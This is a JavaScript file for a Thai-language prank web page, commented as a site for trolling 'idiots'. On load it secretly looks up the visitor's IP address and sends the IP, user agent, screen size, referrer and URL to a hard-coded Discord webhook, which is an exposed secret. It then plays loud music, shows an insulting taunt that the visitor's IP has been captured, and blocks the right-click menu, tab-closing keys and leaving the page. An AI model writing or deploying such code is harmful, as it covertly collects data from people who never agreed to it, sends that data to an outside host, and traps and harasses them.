// เว็บแกล้งควาย - แจ้ง Discord โหดๆ
// ใส่ลิงก์ Webhook: Server → Channel → Edit Channel → Integrations → Webhooks
var DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1470795594678145206/HOLFrsBRi6FLdXCeyPDWgCAa-L02tJCIS1NkDqmbtAlETQepsOk7ZwhJZTPeQ1v3XzaD';  // ใส่ URL ของ Discord Webhook ที่นี่

(function() {
    const bgMusic = document.getElementById('bgMusic');
    const overlay = document.getElementById('clickOverlay');
    const overlayText = overlay.querySelector('h1');
    const ipDisplay = document.getElementById('ipDisplay');

    // แจ้งเข้าดิส (แค่กดเข้าลิงก์) - ส่ง IP, User-Agent, เวลา, Referrer
    function notifyDiscord(ip, event) {
        if (!DISCORD_WEBHOOK_URL) return;
        var payload = {
            embeds: [{
                title: 'มีคนเข้าเว็บ!',
                description: event,
                color: 0xFF0000,
                fields: [
                    { name: 'IP', value: ip || 'ไม่ทราบ', inline: true },
                    { name: 'เวลา', value: new Date().toLocaleString('th-TH'), inline: true },
                    { name: 'หน้าจอ', value: window.screen.width + ' x ' + window.screen.height, inline: true },
                    { name: 'User-Agent', value: (navigator.userAgent || '-').substring(0, 1000), inline: false },
                    { name: 'Referrer', value: (document.referrer || '-').substring(0, 1000), inline: false },
                    { name: 'URL', value: window.location.href, inline: false }
                ]
            }]
        };
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(function() {});
    }

    // ดึง IP แล้วแจ้ง Discord ทันที (ดักโหด - แจ้งตั้งแต่เข้า)
    function fetchIP() {
        fetch('https://api.ipify.org?format=json')
            .then(function(res) { return res.json(); })
            .then(function(data) {
                var ip = data.ip;
                ipDisplay.style.marginTop = '1rem';
                ipDisplay.style.fontSize = '1.2rem';
                ipDisplay.style.color = '#aaa';
                notifyDiscord(ip, 'มีคนกดเข้าลิงก์แล้ว');
            })
            .catch(function() {
                ipDisplay.textContent = 'ไม่สามารถดึง IP ได้';
                notifyDiscord('ไม่ทราบ', 'มีคนกดเข้าลิงก์แล้ว');
            });
    }

    fetchIP();

    function playMusic() {
        if (!bgMusic) return;
        bgMusic.volume = 1.0;
        bgMusic.play().then(function() {
            overlayText.textContent = 'ไอควาย IP มึงโดนกูแล้วไอโง่';
            if (ipDisplay.textContent) {
                ipDisplay.style.color = '#fff';
                ipDisplay.style.marginTop = '1.5rem';
            }
        }).catch(function(err) {
            console.error('เล่นเพลงไม่ได้:', err);
        });
    }

    overlay.addEventListener('click', function() {
        playMusic();
    });

    // block การปิดแท็บ/หน้าต่าง - แสดง dialog ถาม
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = '';
    });

    // ปิดคลิกขวา
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // block ปุ่ม Escape, F5, Ctrl+W, Ctrl+F4
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' || e.key === 'F5' ||
            (e.ctrlKey && e.key === 'w') ||
            (e.ctrlKey && e.key === 'F4') ||
            (e.altKey && e.key === 'F4')) {
            e.preventDefault();
        }
    });

    if (bgMusic) {
        bgMusic.load();
    }
})();
